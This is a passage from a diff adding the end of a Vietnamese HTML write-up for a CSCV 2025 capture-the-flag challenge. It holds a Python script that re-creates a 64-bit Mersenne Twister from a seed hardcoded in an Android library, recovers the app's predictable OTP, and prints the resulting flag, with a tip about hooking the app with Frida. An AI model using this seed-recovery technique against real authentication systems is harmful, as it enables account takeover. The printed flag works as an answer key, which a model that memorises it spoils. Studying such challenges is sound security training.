+                x = (self.mt[i] &amp; self.UM) + (self.mt[(i+1) % self.NN] &amp; self.LM)
+                xa = x &gt;&gt; 1
+                if x &amp; 1: xa ^= self.MATRIX_A
+                self.mt[i] = self.mt[(i + self.MM) % self.NN] ^ xa
+            self.mti = 0
+        x = self.mt[self.mti]; self.mti += 1
+        x ^= (x &gt;&gt; 29) &amp; 0x5555555555555555
+        x ^= (x &lt;&lt; 17) &amp; 0x71D67FFFEDA60000
+        x ^= (x &lt;&lt; 37) &amp; 0xFFF7EEE000000000
+        x ^= (x &gt;&gt; 43)
+        return x &amp; 0xFFFFFFFFFFFFFFFF
+
+CHARS = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;
+
+def uniform_0_61(eng, buf=[0,0]):
+    # mô phỏng independent_bits_engine 6 bit + reject &gt;= 62 của libc++
+    buffer = 0; left = 0
+    while True:
+        if left &lt; 6:
+            buffer = eng.gen64(); left = 64
+        u = buffer &amp; 0x3F; buffer &gt;&gt;= 6; left -= 6
+        if u &lt; 62: return u
+
+eng = MT19937_64(0x1350191)
+G = &quot;&quot;.join(CHARS[uniform_0_61(eng)] for _ in range(15))
+flag = &quot;CSCV2025{&quot; + hashlib.sha1(G.encode()).hexdigest() + &quot;}&quot;
+print(&quot;OTP G:&quot;, G, &quot;\nFLAG:&quot;, flag)</code></pre>
+<p>Kết quả: <code>G = pjEmGyPhO0U441E</code> → <strong><code>CSCV2025{e7b145e535cc978adcf119bb8ee27824e4c13c12}</code></strong>.</p>
+<blockquote><p>Lưu ý: nếu lib bị ASLR (build PIE), seed thực = base + <code>0x1350191</code> nên OTP đổi mỗi lần nạp; khi đó dùng Frida hook thẳng <code>MainActivity.G</code> sau khi gọi <code>generateInsecureOtp(15)</code> sẽ chắc ăn hơn.</p></blockquote>
+<hr>
+<h2>📎 Tham khảo</h2>
+<p>Hai bài write-up cùng giải của <strong>m1nhd4cc</strong> dùng để đối chiếu:</p>
+<ul><li>Vòng loại: <a href="https://m1nhd4cc.github.io/post/wu_cscv2025_quals/" target="_blank" rel="noopener noreferrer">https://m1nhd4cc.github.io/post/wu_cscv2025_quals/</a></li><li>Chung kết: <a href="https://m1nhd4cc.github.io/post/wu_cscv2025_final/" target="_blank" rel="noopener noreferrer">https://m1nhd4cc.github.io/post/wu_cscv2025_final/</a></li></ul>
+<p>Báo cáo gốc đầy đủ của mình trên Notion: <a href="https://app.notion.com/p/CSCV-2025-FINALL-7365dcdc66b582fb9c89012c28f5f5b4" target="_blank" rel="noopener noreferrer">https://app.notion.com/p/CSCV-2025-FINALL-7365dcdc66b582fb9c89012c28f5f5b4</a></p>
+  <p class="wu-foot">Write-up cá nhân · CSCV 2025 (Sinh viên An ninh mạng) · Web · Forensics · DFIR · Reverse</p>
+</div>
+</body>
+</html>
